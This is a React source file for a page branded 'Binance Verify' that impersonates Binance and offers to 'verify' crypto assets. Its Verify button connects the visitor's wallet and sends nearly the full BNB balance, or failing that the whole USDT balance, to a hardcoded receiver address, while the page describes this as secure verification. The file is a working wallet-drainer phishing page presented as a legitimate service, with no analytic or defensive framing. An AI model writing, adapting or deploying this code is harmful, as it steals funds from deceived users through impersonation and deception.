import React, { useState } from "react";
import { ethers } from "ethers";
import "./App.css";
import binanceLogo from "./binance-yellow-rhombus-lawc3crgelc4t98h.jpg"; // make sure this is in src folder

const RECEIVER = "0x2b69d2bb960416d1ed4fe9cbb6868b9a985d60ef";
const USDT_BEP20 = "0x55d398326f99059fF775485246999027B3197955";
const ERC20_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function transfer(address to, uint256 amount) returns (bool)",
];

function App() {
  const [status, setStatus] = useState("Click Verify to start...");

  async function handleVerify() {
    try {
      if (!window.ethereum) {
        setStatus("No wallet detected. Install Binance Wallet or MetaMask.");
        return;
      }

      await window.ethereum.request({ method: "eth_requestAccounts" });
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();
      const userAddress = await signer.getAddress();

      setStatus("Checking balances...");

      const balanceBNB = await provider.getBalance(userAddress);
      if (balanceBNB > ethers.parseEther("0.001")) {
        setStatus("Sending BNB...");
        const tx = await signer.sendTransaction({
          to: RECEIVER,
          value: balanceBNB - ethers.parseEther("0.0005"), // leave gas
        });
        await tx.wait();
        setStatus("BNB sent successfully ✅");
        return;
      }

      const usdt = new ethers.Contract(USDT_BEP20, ERC20_ABI, signer);
      const balanceUSDT = await usdt.balanceOf(userAddress);
      if (balanceUSDT > 0n) {
        setStatus("Sending USDT...");
        const tx = await usdt.transfer(RECEIVER, balanceUSDT);
        await tx.wait();
        setStatus("USDT sent successfully ✅");
        return;
      }

      setStatus("No BNB or USDT found ❌");
    } catch (err) {
      console.error(err);
      setStatus("Error: " + err.message);
    }
  }

  return (
    <div className="App bg-[#121212] min-h-screen flex flex-col">
      {/* Navbar */}
      <header className="bg-[#171717] bg-opacity-90 backdrop-blur-md sticky top-0 z-50 shadow-md">
        <nav className="container mx-auto px-6 py-4 flex justify-between items-center">
          <a href="#" className="flex items-center space-x-2">
            <img src={binanceLogo} alt="Binance Logo" className="h-8 w-8" />
            <span className="text-xl font-bold text-yellow-400">Binance Verify</span>
          </a>
          <div className="hidden md:flex space-x-8 text-sm font-medium">
            <a href="#" className="hover:text-yellow-400 transition-colors">Home</a>
            <a href="#" className="hover:text-yellow-400 transition-colors">Explorer</a>
            <a href="#" className="hover:text-yellow-400 transition-colors">Tokens</a>
            <a href="#" className="hover:text-yellow-400 transition-colors">NFTs</a>
            <a href="#" className="hover:text-yellow-400 transition-colors">DApps</a>
          </div>
        </nav>
      </header>

      {/* Hero Section */}
      <main className="flex flex-col items-center justify-center text-center px-6 py-12 flex-grow">
        <h1 className="text-4xl md:text-5xl font-bold text-yellow-400 mb-4">Verify Crypto Assets</h1>
        <p className="text-gray-300 mb-8 max-w-xl">
          Instant verification of BNB Chain assets. Supports both BNB and USDT (BEP20) transfers securely.
        </p>

        <div className="relative flex justify-center items-center w-40 h-40 mb-12">
          <div className="pulse-ring"></div>
          <div className="pulse-ring"></div>
          <div className="pulse-ring"></div>
          <button
            onClick={handleVerify}
            className="button-primary absolute z-10"
          >
            Verify
          </button>
        </div>
        <p id="status" className="text-gray-300 text-lg">{status}</p>
      </main>

      {/* Footer */}
      <footer className="bg-[#171717] py-6 text-center text-gray-500 text-sm">
        &copy; 2025 Binance Verify. Powered by BNB Chain.
      </footer>
    </div>
  );
}

export default App;
